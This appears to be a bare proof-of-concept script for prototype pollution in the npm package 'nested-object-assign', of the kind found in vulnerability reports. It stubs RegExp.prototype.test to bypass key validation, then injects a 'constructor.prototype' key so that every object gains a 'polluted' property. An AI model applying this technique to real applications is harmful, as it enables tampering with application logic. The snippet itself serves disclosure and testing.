RegExp.prototype.test = () => true;
const assign = require('nested-object-assign');
console.log({}.polluted);
assign({}, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);